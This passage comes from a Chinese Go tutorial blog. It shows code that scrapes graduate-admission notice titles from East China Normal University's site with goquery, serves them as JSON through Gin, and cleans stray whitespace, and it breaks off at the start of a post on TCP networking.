华东师范大学2020年高校思想政治工作骨干在职攻读博</span><br><span class="line">                                                                        ...</span><br><span class="line"></span><br><span class="line">45 :  华东师范大学关于2020年在应届本科毕业生中招收博士</span><br><span class="line">                                                                        ...</span><br><span class="line"></span><br><span class="line">46 :  华东师范大学2020年高校思想政治理论课教师在职攻读</span><br><span class="line">                                                                        ...</span><br><span class="line"></span><br><span class="line">47 :  华东师范大学2020年招收攻读博士学位研究生报考办法</span><br><span class="line">48 :  华东师范大学2020年“申请考核”方式招收博士研究生</span><br><span class="line">                                                                        ...</span><br><span class="line"></span><br><span class="line">49 :  华东师范大学2020年教育博士专业学位研究生招生简章</span><br><span class="line">                                                                        ...</span><br><span class="line"></span><br><span class="line">50 :  华东师范大学2020年教育博士专业学位研究生招生简章</span><br><span class="line">                                                                        ...</span><br><span class="line"></span><br><span class="line">51 :  华东师范大学2020年博士研究生招生简章</span><br><span class="line">52 :  华东师范大学2020年招收攻读博士学位研究生指导教师</span><br><span class="line">                                                                        ...</span><br><span class="line"></span><br><span class="line">53 :  关于2019年博士研究生录取通知书寄发的通知</span><br><span class="line">54 :  华东师范大学关于“定向新疆农业大学培养博士学历师资计</span><br><span class="line">                                                                        ...</span><br><span class="line"></span><br><span class="line">55 :  华东师范大学2019年博士研究生招生复试名单（普通招</span><br><span class="line">                                                                        ...</span><br><span class="line"></span><br><span class="line">56 :  2020年华东师范大学-法国高师集团联合培养研究生项</span><br><span class="line">57 :  上海纽约大学2020年依托我校招收培养研究生</span><br><span class="line">58 :  2019年华东师范大学-法国高师集团联合培养研究生项</span><br></pre></td></tr></table></figure>

<p>可以看到有一些奇怪的省略号，我去官网上检查元素发现确实有，这其实不影响，我们在爬取的信息稍作修改就好</p>
<p>接下来试着把收到的信息完整的显示在新的网络页面上，用一下Gin框架吧</p>
<p>之前的代码也稍做修改，为了便于导入，创建了一个结构体切片</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/PuerkitoBio/goquery&quot;</span></span><br><span class="line">	iconv <span class="string">&quot;github.com/djimenez/iconv-go&quot;</span> <span class="comment">// 给这个库一个别名iconv</span></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> info <span class="keyword">struct</span> &#123;</span><br><span class="line">	ID      <span class="keyword">int</span></span><br><span class="line">	Content <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> information = <span class="built_in">make</span>([]info, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">test</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// connect</span></span><br><span class="line">	res, err := http.Get(<span class="string">&quot;https://yjszs.ecnu.edu.cn/&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;failed to connect&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> res.Body.Close()</span><br><span class="line">	<span class="comment">// check status</span></span><br><span class="line">	<span class="keyword">if</span> res.StatusCode != http.StatusOK &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;status code error&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// load HTML doc</span></span><br><span class="line">	<span class="comment">// 这里选择从一个 io.Reader 创建</span></span><br><span class="line">	doc, err := goquery.NewDocumentFromReader(res.Body)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;failed to load&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 得到了 Document 实例后，通过 Dcoument.Find 方法获取一个 Selection 实例</span></span><br><span class="line">	<span class="comment">// 基于home3list这个class进行查找，然后遍历输出</span></span><br><span class="line">	<span class="keyword">var</span> temp info</span><br><span class="line">	ansDoc := doc.Find(<span class="string">&quot;.home3list&quot;</span>) <span class="comment">// ansDoc 的类型是 *goquery.Selection</span></span><br><span class="line">	ansDoc.Each(<span class="function"><span class="keyword">func</span><span class="params">(i <span class="keyword">int</span>, contentSelection *goquery.Selection)</span></span> &#123;</span><br><span class="line">		ans := contentSelection.Find(<span class="string">&quot;a&quot;</span>).Text()</span><br><span class="line">		<span class="comment">// 转换格式</span></span><br><span class="line">		ans, _ = iconv.ConvertString(ans, <span class="string">&quot;GB2312&quot;</span>, <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">		temp.ID = i + <span class="number">1</span></span><br><span class="line">		temp.Content = ans</span><br><span class="line">		information = <span class="built_in">append</span>(information, temp)</span><br><span class="line">		<span class="comment">//fmt.Println(i+1, &quot;: &quot;, ans)</span></span><br><span class="line">		fmt.Println(information[i].ID, <span class="string">&quot;:&quot;</span>, information[i].Content)</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	test()</span><br><span class="line">	r := gin.Default()</span><br><span class="line">	r.GET(<span class="string">&quot;/crawler&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		data := information</span><br><span class="line">		c.JSON(http.StatusOK, data)</span><br><span class="line">	&#125;)</span><br><span class="line">	r.Run(<span class="string">&quot;:9090&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们可以在<a href="http://127.0.0.1:9090/crawler%E7%9C%8B%E8%A7%81%E7%88%AC%E5%8F%96%E7%9A%84%E4%BF%A1%E6%81%AF%EF%BC%8C%E4%BD%86%E6%98%AF%E4%B9%B1%E5%BE%97%E4%B8%80%E5%A1%8C%E7%B3%8A%E6%B6%82%EF%BC%8C%E5%A6%82%E4%B8%8B">http://127.0.0.1:9090/crawler看见爬取的信息，但是乱得一塌糊涂，如下</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&#123;&quot;ID&quot;:1,&quot;Content&quot;:&quot;华东师范大学2020年硕士研究生招生考试初试自命题成&quot;&#125;,&#123;&quot;ID&quot;:2,&quot;Content&quot;:&quot;华东师范大学关于2020年硕士研究生招生考试初试成绩&quot;&#125;,&#123;&quot;ID&quot;:3,&quot;Content&quot;:&quot;华东师范大学2020年硕士研究生入学考试 艺术类考生&quot;&#125;,&#123;&quot;ID&quot;:4,&quot;Content&quot;:&quot;2020年“少数民族高层次骨干人才计划”研究生报考注&quot;&#125;,&#123;&quot;ID&quot;:5,&quot;Content&quot;:&quot;2020年“上海市教硕-规培相结合项目”招生简章&quot;&#125;,&#123;&quot;ID&quot;:6,&quot;Content&quot;:&quot;关于开展2020年硕士研究生招生网上咨询的通知&quot;&#125;,&#123;&quot;ID&quot;:7,&quot;Content&quot;:&quot;华东师范大学2020年硕士研究生招生专业目录&quot;&#125;,&#123;&quot;ID&quot;:8,&quot;Content&quot;:&quot;华东师范大学2020年硕士研究生招生简章&quot;&#125;,&#123;&quot;ID&quot;:9,&quot;Content&quot;:&quot;关于举办2020年研究生报考咨询活动的通知（校内场）&quot;&#125;,&#123;&quot;ID&quot;:10,&quot;Content&quot;:&quot;关于2019年硕士研究生录取通知书寄发的通知&quot;&#125;,&#123;&quot;ID&quot;:11,&quot;Content&quot;:&quot;华东师范大学2020年研究生招生宣传现场咨询会公告&quot;&#125;,&#123;&quot;ID&quot;:12,&quot;Content&quot;:&quot;关于2019级新生户口迁移党团组织转接及录取通知书相&quot;&#125;,&#123;&quot;ID&quot;:13,&quot;Content&quot;:&quot;2019年硕士研究生招生拟录取名单公示（不含推免生）&quot;&#125;,&#123;&quot;ID&quot;:14,&quot;Content&quot;:&quot;关于举办2019年暑期全国优秀大学生夏令营活动的通知&quot;&#125;,&#123;&quot;ID&quot;:15,&quot;Content&quot;:&quot;关于2019年硕士研究生拟录取后相关工作的通知&quot;&#125;,&#123;&quot;ID&quot;:16,&quot;Content&quot;:&quot;2020年上海市硕士研究生招生考试报名费电子发票已可&quot;&#125;,&#123;&quot;ID&quot;:17,&quot;Content&quot;:&quot;202001批次同等学力申硕课程考试准考证下载公告&quot;&#125;,&#123;&quot;ID&quot;:18,&quot;Content&quot;:&quot;202001批次同等学力申硕课程考试报名通知&quot;&#125;,&#123;&quot;ID&quot;:19,&quot;Content&quot;:&quot;2020年全国硕士研究生招生考试华东师范大学（311&quot;&#125;,&#123;&quot;ID&quot;:20,&quot;Content&quot;:&quot;华东师范大学研究生招生考试违规违法行为举报电话&quot;&#125;,&#123;&quot;ID&quot;:21,&quot;Content&quot;:&quot;华东师范大学考点2020年硕士研究生招生考试初试地点&quot;&#125;,&#123;&quot;ID&quot;:22,&quot;Content&quot;:&quot;华东师范大学考点（3111）2020年硕士研究生招生&quot;&#125;,&#123;&quot;ID&quot;:23,&quot;Content&quot;:&quot;201907批次同等学力申硕课程考试成绩公布公告&quot;&#125;,&#123;&quot;ID&quot;:24,&quot;Content&quot;:&quot;华东师范大学报考点（报考点代码3111）2020年硕&quot;&#125;,&#123;&quot;ID&quot;:25,&quot;Content&quot;:&quot;关于进一步严格规范硕士研究生招生考试培训行为的通知&quot;&#125;,&#123;&quot;ID&quot;:26,&quot;Content&quot;:&quot;关于推迟2020年面向香港、澳门、台湾地区研究生招生\n\t\t\t\t\t\t\t\t\t...\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t&quot;&#125;,&#123;&quot;ID&quot;:27,&quot;Content&quot;:&quot;2020年面向港澳台地区招收研究生华东师范大学报考点\n\t\t\t\t\t\t\t\t\t...\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t&quot;&#125;,&#123;&quot;ID&quot;:28,&quot;Content&quot;:&quot;华东师范大学2020年面向香港、澳门、台湾地区招收研\n\t\t\t\t\t\t\t\t\t...\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t&quot;&#125;,&#123;&quot;ID&quot;:29,&quot;Content&quot;:&quot;华东师范大学2019年面向香港、澳门、台湾地区招收研\n\t\t\t\t\t\t\t\t\t...\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t&quot;&#125;,&#123;&quot;ID&quot;:30,&quot;Content&quot;:&quot;关于2020年公费师范毕业生攻读非全日制教育硕士推迟\n\t\t\t\t\t\t\t\t\t...\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t&quot;&#125;,&#123;&quot;ID&quot;:31,&quot;Content&quot;:&quot;华东师范大学2020年推荐免试攻读硕士学位研究生拟录\n\t\t\t\t\t\t\t\t\t...\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t&quot;&#125;,&#123;&quot;ID&quot;:32,&quot;Content&quot;:&quot;华东师范大学2020年推免生（含直博生）接收专业和人\n\t\t\t\t\t\t\t\t\t...\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t&quot;&#125;,&#123;&quot;ID&quot;:33,&quot;Content&quot;:&quot;我校各院系2020年推免生（含直博生）接收方案\n\t\t\t\t\t\t\t\t\t&quot;&#125;,&#123;&quot;ID&quot;:34,&quot;Content&quot;:&quot;华东师范大学2020年推免生（含直博生）接收方案\n\t\t\t\t\t\t\t\t\t&quot;&#125;,&#123;&quot;ID&quot;:35,&quot;Content&quot;:&quot;2020年公费师范毕业生攻读非全日制教育硕士招生简章\n\t\t\t\t\t\t\t\t\t&quot;&#125;,&#123;&quot;ID&quot;:36,&quot;Content&quot;:&quot;2019年公费师范生申请攻读教育硕士专业学位拟录取名\n\t\t\t\t\t\t\t\t\t...\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t&quot;&#125;,&#123;&quot;ID&quot;:37,&quot;Content&quot;:&quot;关于申请2019年教育硕士的公费师范毕业生提交单位考\n\t\t\t\t\t\t\t\t\t...\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t&quot;&#125;,&#123;&quot;ID&quot;:38,&quot;Content&quot;:&quot;我校各院系2019年推免生（含直博生）接收方案\n\t\t\t\t\t\t\t\t\t&quot;&#125;,&#123;&quot;ID&quot;:39,&quot;Content&quot;:&quot;2019年免费师范毕业生攻读非全日制教育硕士招生简章\n\t\t\t\t\t\t\t\t\t&quot;&#125;,&#123;&quot;ID&quot;:40,&quot;Content&quot;:&quot;2019年推免生接收申请预报名的通知\n\t\t\t\t\t\t\t\t\t&quot;&#125;,&#123;&quot;ID&quot;:41,&quot;Content&quot;:&quot;关于我校2020年博士研究生招生近期工作的公告&quot;&#125;,&#123;&quot;ID&quot;:42,&quot;Content&quot;:&quot;华东师范大学2020年博士研究生招生“申请考核”专业\n\t\t\t\t\t\t\t\t\t...\n\t\t\t\t\t\t\t\t\t&quot;&#125;,&#123;&quot;ID&quot;:43,&quot;Content&quot;:&quot;华东师范大学2020年博士研究生招生“申请考核”报考\n\t\t\t\t\t\t\t\t\t...\n\t\t\t\t\t\t\t\t\t&quot;&#125;,&#123;&quot;ID&quot;:44,&quot;Content&quot;:&quot;华东师范大学2020年高校思想政治工作骨干在职攻读博\n\t\t\t\t\t\t\t\t\t...\n\t\t\t\t\t\t\t\t\t&quot;&#125;,&#123;&quot;ID&quot;:45,&quot;Content&quot;:&quot;华东师范大学关于2020年在应届本科毕业生中招收博士\n\t\t\t\t\t\t\t\t\t...\n\t\t\t\t\t\t\t\t\t&quot;&#125;,&#123;&quot;ID&quot;:46,&quot;Content&quot;:&quot;华东师范大学2020年高校思想政治理论课教师在职攻读\n\t\t\t\t\t\t\t\t\t...\n\t\t\t\t\t\t\t\t\t&quot;&#125;,&#123;&quot;ID&quot;:47,&quot;Content&quot;:&quot;华东师范大学2020年招收攻读博士学位研究生报考办法&quot;&#125;,&#123;&quot;ID&quot;:48,&quot;Content&quot;:&quot;华东师范大学2020年“申请考核”方式招收博士研究生\n\t\t\t\t\t\t\t\t\t...\n\t\t\t\t\t\t\t\t\t&quot;&#125;,&#123;&quot;ID&quot;:49,&quot;Content&quot;:&quot;华东师范大学2020年教育博士专业学位研究生招生简章\n\t\t\t\t\t\t\t\t\t...\n\t\t\t\t\t\t\t\t\t&quot;&#125;,&#123;&quot;ID&quot;:50,&quot;Content&quot;:&quot;华东师范大学2020年教育博士专业学位研究生招生简章\n\t\t\t\t\t\t\t\t\t...\n\t\t\t\t\t\t\t\t\t&quot;&#125;,&#123;&quot;ID&quot;:51,&quot;Content&quot;:&quot;华东师范大学2020年博士研究生招生简章&quot;&#125;,&#123;&quot;ID&quot;:52,&quot;Content&quot;:&quot;华东师范大学2020年招收攻读博士学位研究生指导教师\n\t\t\t\t\t\t\t\t\t...\n\t\t\t\t\t\t\t\t\t&quot;&#125;,&#123;&quot;ID&quot;:53,&quot;Content&quot;:&quot;关于2019年博士研究生录取通知书寄发的通知&quot;&#125;,&#123;&quot;ID&quot;:54,&quot;Content&quot;:&quot;华东师范大学关于“定向新疆农业大学培养博士学历师资计\n\t\t\t\t\t\t\t\t\t...\n\t\t\t\t\t\t\t\t\t&quot;&#125;,&#123;&quot;ID&quot;:55,&quot;Content&quot;:&quot;华东师范大学2019年博士研究生招生复试名单（普通招\n\t\t\t\t\t\t\t\t\t...\n\t\t\t\t\t\t\t\t\t&quot;&#125;,&#123;&quot;ID&quot;:56,&quot;Content&quot;:&quot;2020年华东师范大学-法国高师集团联合培养研究生项&quot;&#125;,&#123;&quot;ID&quot;:57,&quot;Content&quot;:&quot;上海纽约大学2020年依托我校招收培养研究生&quot;&#125;,&#123;&quot;ID&quot;:58,&quot;Content&quot;:&quot;2019年华东师范大学-法国高师集团联合培养研究生项&quot;&#125;]</span><br></pre></td></tr></table></figure>

<p>后端处理的时候把多余的\t 给replace掉，最终代码如下</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/PuerkitoBio/goquery&quot;</span></span><br><span class="line">	iconv <span class="string">&quot;github.com/djimenez/iconv-go&quot;</span> <span class="comment">// 给这个库一个别名iconv</span></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> info <span class="keyword">struct</span> &#123;</span><br><span class="line">	ID      <span class="keyword">int</span></span><br><span class="line">	Content <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> information = <span class="built_in">make</span>([]info, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">test</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// connect</span></span><br><span class="line">	res, err := http.Get(<span class="string">&quot;https://yjszs.ecnu.edu.cn/&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;failed to connect&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> res.Body.Close()</span><br><span class="line">	<span class="comment">// check status</span></span><br><span class="line">	<span class="keyword">if</span> res.StatusCode != http.StatusOK &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;status code error&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// load HTML doc</span></span><br><span class="line">	<span class="comment">// 这里选择从一个 io.Reader 创建</span></span><br><span class="line">	doc, err := goquery.NewDocumentFromReader(res.Body)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;failed to load&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 得到了 Document 实例后，通过 Dcoument.Find 方法获取一个 Selection 实例</span></span><br><span class="line">	<span class="comment">// 基于home3list这个class进行查找，然后遍历输出</span></span><br><span class="line">	<span class="keyword">var</span> temp info</span><br><span class="line">	ansDoc := doc.Find(<span class="string">&quot;.home3list&quot;</span>) <span class="comment">// ansDoc 的类型是 *goquery.Selection</span></span><br><span class="line">	ansDoc.Each(<span class="function"><span class="keyword">func</span><span class="params">(i <span class="keyword">int</span>, contentSelection *goquery.Selection)</span></span> &#123;</span><br><span class="line">		ans := contentSelection.Find(<span class="string">&quot;a&quot;</span>).Text()</span><br><span class="line">		<span class="comment">// 转换格式</span></span><br><span class="line">		ans, _ = iconv.ConvertString(ans, <span class="string">&quot;GB2312&quot;</span>, <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">		temp.ID = i + <span class="number">1</span></span><br><span class="line">		ans = strings.Replace(ans, <span class="string">&quot;\t&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="number">-1</span>)</span><br><span class="line">		ans = strings.Replace(ans, <span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="number">-1</span>)</span><br><span class="line">		ans = strings.Replace(ans, <span class="string">&quot;...&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="number">-1</span>)</span><br><span class="line">		temp.Content = ans</span><br><span class="line">		information = <span class="built_in">append</span>(information, temp)</span><br><span class="line">		<span class="comment">//fmt.Println(i+1, &quot;: &quot;, ans)</span></span><br><span class="line">		fmt.Println(information[i].ID, <span class="string">&quot;:&quot;</span>, information[i].Content)</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	test()</span><br><span class="line">	r := gin.Default()</span><br><span class="line">	r.GET(<span class="string">&quot;/crawler&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		data := information</span><br><span class="line">		c.JSON(http.StatusOK, data)</span><br><span class="line">	&#125;)</span><br><span class="line">	r.Run(<span class="string">&quot;:9090&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>效果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&#123;&quot;ID&quot;:1,&quot;Content&quot;:&quot;华东师范大学2020年硕士研究生招生考试初试自命题成&quot;&#125;,&#123;&quot;ID&quot;:2,&quot;Content&quot;:&quot;华东师范大学关于2020年硕士研究生招生考试初试成绩&quot;&#125;,&#123;&quot;ID&quot;:3,&quot;Content&quot;:&quot;华东师范大学2020年硕士研究生入学考试 艺术类考生&quot;&#125;,&#123;&quot;ID&quot;:4,&quot;Content&quot;:&quot;2020年“少数民族高层次骨干人才计划”研究生报考注&quot;&#125;,&#123;&quot;ID&quot;:5,&quot;Content&quot;:&quot;2020年“上海市教硕-规培相结合项目”招生简章&quot;&#125;,&#123;&quot;ID&quot;:6,&quot;Content&quot;:&quot;关于开展2020年硕士研究生招生网上咨询的通知&quot;&#125;,&#123;&quot;ID&quot;:7,&quot;Content&quot;:&quot;华东师范大学2020年硕士研究生招生专业目录&quot;&#125;,&#123;&quot;ID&quot;:8,&quot;Content&quot;:&quot;华东师范大学2020年硕士研究生招生简章&quot;&#125;,&#123;&quot;ID&quot;:9,&quot;Content&quot;:&quot;关于举办2020年研究生报考咨询活动的通知（校内场）&quot;&#125;,&#123;&quot;ID&quot;:10,&quot;Content&quot;:&quot;关于2019年硕士研究生录取通知书寄发的通知&quot;&#125;,&#123;&quot;ID&quot;:11,&quot;Content&quot;:&quot;华东师范大学2020年研究生招生宣传现场咨询会公告&quot;&#125;,&#123;&quot;ID&quot;:12,&quot;Content&quot;:&quot;关于2019级新生户口迁移党团组织转接及录取通知书相&quot;&#125;,&#123;&quot;ID&quot;:13,&quot;Content&quot;:&quot;2019年硕士研究生招生拟录取名单公示（不含推免生）&quot;&#125;,&#123;&quot;ID&quot;:14,&quot;Content&quot;:&quot;关于举办2019年暑期全国优秀大学生夏令营活动的通知&quot;&#125;,&#123;&quot;ID&quot;:15,&quot;Content&quot;:&quot;关于2019年硕士研究生拟录取后相关工作的通知&quot;&#125;,&#123;&quot;ID&quot;:16,&quot;Content&quot;:&quot;2020年上海市硕士研究生招生考试报名费电子发票已可&quot;&#125;,&#123;&quot;ID&quot;:17,&quot;Content&quot;:&quot;202001批次同等学力申硕课程考试准考证下载公告&quot;&#125;,&#123;&quot;ID&quot;:18,&quot;Content&quot;:&quot;202001批次同等学力申硕课程考试报名通知&quot;&#125;,&#123;&quot;ID&quot;:19,&quot;Content&quot;:&quot;2020年全国硕士研究生招生考试华东师范大学（311&quot;&#125;,&#123;&quot;ID&quot;:20,&quot;Content&quot;:&quot;华东师范大学研究生招生考试违规违法行为举报电话&quot;&#125;,&#123;&quot;ID&quot;:21,&quot;Content&quot;:&quot;华东师范大学考点2020年硕士研究生招生考试初试地点&quot;&#125;,&#123;&quot;ID&quot;:22,&quot;Content&quot;:&quot;华东师范大学考点（3111）2020年硕士研究生招生&quot;&#125;,&#123;&quot;ID&quot;:23,&quot;Content&quot;:&quot;201907批次同等学力申硕课程考试成绩公布公告&quot;&#125;,&#123;&quot;ID&quot;:24,&quot;Content&quot;:&quot;华东师范大学报考点（报考点代码3111）2020年硕&quot;&#125;,&#123;&quot;ID&quot;:25,&quot;Content&quot;:&quot;关于进一步严格规范硕士研究生招生考试培训行为的通知&quot;&#125;,&#123;&quot;ID&quot;:26,&quot;Content&quot;:&quot;关于推迟2020年面向香港、澳门、台湾地区研究生招生&quot;&#125;,&#123;&quot;ID&quot;:27,&quot;Content&quot;:&quot;2020年面向港澳台地区招收研究生华东师范大学报考点&quot;&#125;,&#123;&quot;ID&quot;:28,&quot;Content&quot;:&quot;华东师范大学2020年面向香港、澳门、台湾地区招收研&quot;&#125;,&#123;&quot;ID&quot;:29,&quot;Content&quot;:&quot;华东师范大学2019年面向香港、澳门、台湾地区招收研&quot;&#125;,&#123;&quot;ID&quot;:30,&quot;Content&quot;:&quot;关于2020年公费师范毕业生攻读非全日制教育硕士推迟&quot;&#125;,&#123;&quot;ID&quot;:31,&quot;Content&quot;:&quot;华东师范大学2020年推荐免试攻读硕士学位研究生拟录&quot;&#125;,&#123;&quot;ID&quot;:32,&quot;Content&quot;:&quot;华东师范大学2020年推免生（含直博生）接收专业和人&quot;&#125;,&#123;&quot;ID&quot;:33,&quot;Content&quot;:&quot;我校各院系2020年推免生（含直博生）接收方案&quot;&#125;,&#123;&quot;ID&quot;:34,&quot;Content&quot;:&quot;华东师范大学2020年推免生（含直博生）接收方案&quot;&#125;,&#123;&quot;ID&quot;:35,&quot;Content&quot;:&quot;2020年公费师范毕业生攻读非全日制教育硕士招生简章&quot;&#125;,&#123;&quot;ID&quot;:36,&quot;Content&quot;:&quot;2019年公费师范生申请攻读教育硕士专业学位拟录取名&quot;&#125;,&#123;&quot;ID&quot;:37,&quot;Content&quot;:&quot;关于申请2019年教育硕士的公费师范毕业生提交单位考&quot;&#125;,&#123;&quot;ID&quot;:38,&quot;Content&quot;:&quot;我校各院系2019年推免生（含直博生）接收方案&quot;&#125;,&#123;&quot;ID&quot;:39,&quot;Content&quot;:&quot;2019年免费师范毕业生攻读非全日制教育硕士招生简章&quot;&#125;,&#123;&quot;ID&quot;:40,&quot;Content&quot;:&quot;2019年推免生接收申请预报名的通知&quot;&#125;,&#123;&quot;ID&quot;:41,&quot;Content&quot;:&quot;关于我校2020年博士研究生招生近期工作的公告&quot;&#125;,&#123;&quot;ID&quot;:42,&quot;Content&quot;:&quot;华东师范大学2020年博士研究生招生“申请考核”专业&quot;&#125;,&#123;&quot;ID&quot;:43,&quot;Content&quot;:&quot;华东师范大学2020年博士研究生招生“申请考核”报考&quot;&#125;,&#123;&quot;ID&quot;:44,&quot;Content&quot;:&quot;华东师范大学2020年高校思想政治工作骨干在职攻读博&quot;&#125;,&#123;&quot;ID&quot;:45,&quot;Content&quot;:&quot;华东师范大学关于2020年在应届本科毕业生中招收博士&quot;&#125;,&#123;&quot;ID&quot;:46,&quot;Content&quot;:&quot;华东师范大学2020年高校思想政治理论课教师在职攻读&quot;&#125;,&#123;&quot;ID&quot;:47,&quot;Content&quot;:&quot;华东师范大学2020年招收攻读博士学位研究生报考办法&quot;&#125;,&#123;&quot;ID&quot;:48,&quot;Content&quot;:&quot;华东师范大学2020年“申请考核”方式招收博士研究生&quot;&#125;,&#123;&quot;ID&quot;:49,&quot;Content&quot;:&quot;华东师范大学2020年教育博士专业学位研究生招生简章&quot;&#125;,&#123;&quot;ID&quot;:50,&quot;Content&quot;:&quot;华东师范大学2020年教育博士专业学位研究生招生简章&quot;&#125;,&#123;&quot;ID&quot;:51,&quot;Content&quot;:&quot;华东师范大学2020年博士研究生招生简章&quot;&#125;,&#123;&quot;ID&quot;:52,&quot;Content&quot;:&quot;华东师范大学2020年招收攻读博士学位研究生指导教师&quot;&#125;,&#123;&quot;ID&quot;:53,&quot;Content&quot;:&quot;关于2019年博士研究生录取通知书寄发的通知&quot;&#125;,&#123;&quot;ID&quot;:54,&quot;Content&quot;:&quot;华东师范大学关于“定向新疆农业大学培养博士学历师资计&quot;&#125;,&#123;&quot;ID&quot;:55,&quot;Content&quot;:&quot;华东师范大学2019年博士研究生招生复试名单（普通招&quot;&#125;,&#123;&quot;ID&quot;:56,&quot;Content&quot;:&quot;2020年华东师范大学-法国高师集团联合培养研究生项&quot;&#125;,&#123;&quot;ID&quot;:57,&quot;Content&quot;:&quot;上海纽约大学2020年依托我校招收培养研究生&quot;&#125;,&#123;&quot;ID&quot;:58,&quot;Content&quot;:&quot;2019年华东师范大学-法国高师集团联合培养研究生项&quot;&#125;]</span><br></pre></td></tr></table></figure>

<p>自己看的话其实还是在终端里看起来清晰直观，至于什么还觉得不美观啥的，这就叫给前端解析了，俺不会了</p>
]]></content>
      <tags>
        <tag>GO</tag>
      </tags>
  </entry>
  <entry>
    <title>GO_note_网络遍程</title>
    <url>/2020/03/02/Go-note-%E7%BD%91%E7%BB%9C%E9%81%8D%E7%A8%8B/</url>
    <content><![CDATA[<p>GO入门学习，网络编程</p>
<span id="more"></span>

<p>学习资料：<a href="https://www.liwenzhou.com/posts/Go/go_menu/">https://www.liwenzhou.com/posts/Go/go_menu/</a></p>
<h3 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h3><h4 id="server"><a href="#server" class="headerlink" title="server"></a>server</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;bufio&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;net&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">process</span><span class="params">(conn net.Conn)</span></span> &#123;</span><br><span class="line">	<span class="keyword">defer</span> conn.Close() <span class="comment">//处理完后，关闭连接</span></span><br><span 